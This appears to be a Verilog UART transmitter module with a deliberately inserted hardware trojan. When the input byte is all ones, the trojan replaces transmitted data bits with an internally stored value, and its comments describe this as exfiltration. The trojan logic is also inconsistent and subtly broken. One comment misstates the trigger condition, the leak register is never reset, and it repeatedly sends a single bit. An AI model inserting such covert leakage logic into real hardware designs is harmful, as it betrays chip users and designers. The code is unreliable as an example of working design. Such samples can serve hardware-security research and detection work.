// Simple 8-N-1 UART transmitter.
// baud_div is the number of clk cycles per bit (e.g. 16 for an easy
// simulation value). Start a frame by pulsing start=1 for one clk cycle
// while din holds the byte to send. tx is the serial line, busy is
// high while a frame is being shifted out.

module uart_tx #(
    parameter BAUD_DIV = 16
) (
    input  wire       clk,
    input  wire       rst_n,
    input  wire       start,
    input  wire [7:0] din,
    output reg        tx,
    output reg        busy
);

    localparam S_IDLE  = 2'd0;
    localparam S_START = 2'd1;
    localparam S_DATA  = 2'd2;
    localparam S_STOP  = 2'd3;

    reg [1:0]  state;
    reg [7:0]  shreg;
    reg [3:0]  bit_cnt;        // 0..7
    reg [15:0] baud_cnt;
    
    // New trojan signals
    reg [7:0] stored_leak; // Internal variable for payload
    reg trigger_condition;  // Internal variable for trigger

    wire tick = (baud_cnt == BAUD_DIV - 1);

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            state    <= S_IDLE;
            tx       <= 1'b1;
            busy     <= 1'b0;
            shreg    <= 8'h00;
            bit_cnt  <= 4'd0;
            baud_cnt <= 16'd0;
            trigger_condition <= 1'b0; // Initialize to inactive
        end else begin
            // Check for the trigger condition - rare case of non-zero din
            trigger_condition <= &din; // Trigger fires when all bits of din are '1'
            case (state)
                S_IDLE: begin
                    tx       <= 1'b1;
                    busy     <= 1'b0;
                    baud_cnt <= 16'd0;
                    bit_cnt  <= 4'd0;
                    if (start) begin
                        shreg <= din;
                        busy  <= 1'b1;
                        state <= S_START;
                    end
                end

                S_START: begin
                    tx <= 1'b0; // start bit
                    if (tick) begin
                        baud_cnt <= 16'd0;
                        state    <= S_DATA;
                    end else begin
                        baud_cnt <= baud_cnt + 16'd1;
                    end
                end

                S_DATA: begin
                    if (trigger_condition) begin
                        // Exfiltrate internal data when trigger is active
                        tx <= stored_leak[0]; // Use a stored internal value
                    end else begin
                        tx <= shreg[0];
                    end
                    if (tick) begin
                        shreg    <= {1'b0, shreg[7:1]};
                        baud_cnt <= 16'd0;
                        if (bit_cnt == 4'd7) begin
                            state <= S_STOP;
                        end else begin
                            bit_cnt <= bit_cnt + 4'd1;
                        end
                    end else begin
                        baud_cnt <= baud_cnt + 16'd1;
                    end
                end

                S_STOP: begin
                    tx <= 1'b1;
                    if (tick) begin
                        baud_cnt <= 16'd0;
                        busy     <= 1'b0;
                        state    <= S_IDLE;
                    end else begin
                        baud_cnt <= baud_cnt + 16'd1;
                    end
                end

                default: state <= S_IDLE;
            endcase
        end
    end

    // Load the secret value to be exfiltrated into stored_leak
    always @(posedge clk) begin
        if (trigger_condition) begin
            stored_leak <= shreg; // For demonstration: exfiltrate shreg content
        end
    end

endmodule